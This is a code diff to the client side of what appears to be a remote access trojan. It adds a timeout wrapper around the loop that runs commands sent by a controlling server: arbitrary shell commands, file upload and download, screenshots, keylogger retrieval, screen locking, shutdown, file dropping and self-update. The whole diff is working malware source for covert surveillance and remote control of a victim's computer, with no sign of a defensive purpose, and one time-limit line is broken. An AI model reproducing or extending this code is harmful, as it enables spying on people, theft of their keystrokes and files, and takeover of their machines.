@@ -12,6 +12,27 @@ import commands
 import key_logger
 import config
 
+from contextlib import contextmanager
+import threading
+import _thread
+
+class TimeoutException(Exception):
+    def __init__(self, msg=''):
+        self.msg = msg
+
+@contextmanager
+def time_limit(seconds, msg=''):
+    timer = threading.Timer(seconds, lambda: _thread.interrupt_main())
+    timer.start()
+    try:
+        yield
+    except KeyboardInterrupt:
+        print("выполнение не уложилось в заданный срок")
+    finally:
+        # if the action ends in specified time, timer is canceled
+        timer.cancel()
+
+
 
 class Client:
 
@@ -103,60 +124,67 @@ class Client:
     def run(self):
         while True:
             command = self.receive_json()
-            try:
-                match command[0]:
-                    case "ping":
-                         command_response = "pong"
-                    case "exit":
-                        self.connection.close()
-                        sys.exit()
-                    case "ratHelp":
-                        command_response = ""
-                    case "cd":
-                        if len(command) > 1:
-                            os.chdir(command[1])
-                        convCommand = self.arrayToString(command)
-                        command_response = self.runCommand(convCommand).decode()
-                    case "upload":
-                        command_response = self.writeFile(command[1], command[2])
-                    case "download":
-                        command_response = self.readFile(command[1]).decode()
-                    case "message":
-                        command_response = commands.message(command[:1])
-                    case "lock":
-                        command_response = commands.lock_pc()
-                    case "shutdown":
-                        command_response = commands.shutdown_pc()
-                    case "restart":
-                        command_response = commands.restart_pc()
-                    case "screenshot":
-                        command_response = self.screen_handler()
-                    case "screamer":
-                        command_response = commands.screamer()
-                    case "syscom":
-                        command_response = commands.sys_command(command[1:])
-                    case "drop":
-                        command_response = commands.drop(command[1], command[2])
-                    case "update_client":
-                        command_response = commands.update_client(command[1], command[2])
-                        self.send_json(command_response)
-                        self.connection.close()
-                        exit()
-                    case "clires":
-                        self.send_json(commands.restart_client())
-                        self.connection.close()
-                        exit()
-                    case "keylogger":
-                        command_response = self.keylogger.get_keylogs()
-                    case _:
-                        convCommand = self.arrayToString(command)
-                        command_response = command_response = self.runCommand(convCommand).decode()
-            # Whole error handling, bad practice but required to keep connection
-            except Exception as e:
-                command_response = (
-                    f"Ошибка выполнения команды: {e}"
-                )
-            self.send_json(command_response)
+            print(command)
+            num_time_limit = 18
+            if "time_limit" in command:
+                num_time_limit = int(command.split("time_limit"))
+            complited = False
+            with time_limit(num_time_limit, "sleep"):
+                try:
+                    match command[0]:
+                        case "ping":
+                            command_response = "pong"
+                        case "exit":
+                            self.connection.close()
+                            sys.exit()
+                        case "ratHelp":
+                            command_response = ""
+                        case "cd":
+                            if len(command) > 1:
+                                os.chdir(command[1])
+                            convCommand = self.arrayToString(command)
+                            command_response = self.runCommand(convCommand).decode()
+                        case "upload":
+                            command_response = self.writeFile(command[1], command[2])
+                        case "download":
+                            command_response = self.readFile(command[1]).decode()
+                        case "message":
+                            command_response = commands.message(command[:1])
+                        case "lock":
+                            command_response = commands.lock_pc()
+                        case "shutdown":
+                            command_response = commands.shutdown_pc()
+                        case "restart":
+                            command_response = commands.restart_pc()
+                        case "screenshot":
+                            command_response = self.screen_handler()
+                        case "screamer":
+                            command_response = commands.screamer()
+                        case "syscom":
+                            command_response = commands.sys_command(command[1:])
+                        case "drop":
+                            command_response = commands.drop(command[1], command[2])
+                        case "update_client":
+                            command_response = commands.update_client(command[1], command[2])
+                            self.send_json(command_response)
+                            self.connection.close()
+                            exit()
+                        case "clires":
+                            self.send_json(commands.restart_client())
+                            self.connection.close()
+                            exit()
+                        case "keylogger":
+                            command_response = self.keylogger.get_keylogs()
+                        case _:
+                            convCommand = self.arrayToString(command)
+                            command_response = command_response = self.runCommand(convCommand).decode()
+                # Whole error handling, bad practice but required to keep connection
+                except Exception as e:
+                    command_response = (f"Ошибка выполнения команды: {e}")
+                self.send_json(command_response)
+                complited = True
+            if not complited:
+                self.send_json("выполнение не уложилось в заданный срок")
 
 
 def restarter(client: Client):
